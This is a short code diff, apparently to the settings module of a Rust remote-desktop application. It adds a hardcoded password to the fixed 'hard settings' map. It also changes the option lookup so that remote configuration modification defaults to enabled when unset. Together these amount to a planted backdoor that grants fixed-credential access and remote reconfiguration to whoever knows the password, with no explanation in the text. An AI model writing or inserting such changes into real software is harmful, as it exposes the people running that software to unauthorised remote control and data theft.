@@ -79,7 +79,11 @@ lazy_static::lazy_static! {
     pub static ref OVERWRITE_DISPLAY_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref DEFAULT_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref OVERWRITE_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
-    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
+    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = {
+        let mut map=HashMap::new();
+        map.insert("password".to_string(),"Godofwar5946.".to_string());
+        RwLock::new(map)
+    };
     pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
 }
 
@@ -1242,14 +1246,19 @@ impl Config {
         config.store();
     }
 
-    pub fn get_option(k: &str) -> String {
-        get_or(
+     pub fn get_option(k: &str) -> String {
+        let v = get_or(
             &OVERWRITE_SETTINGS,
             &CONFIG2.read().unwrap().options,
             &DEFAULT_SETTINGS,
             k,
-        )
-        .unwrap_or_default()
+        );
+
+        if v.is_none() && k == keys::OPTION_ALLOW_REMOTE_CONFIG_MODIFICATION {
+            return "Y".to_owned();
+        }
+
+        v.unwrap_or_default()
     }
 
     pub fn get_bool_option(k: &str) -> bool {
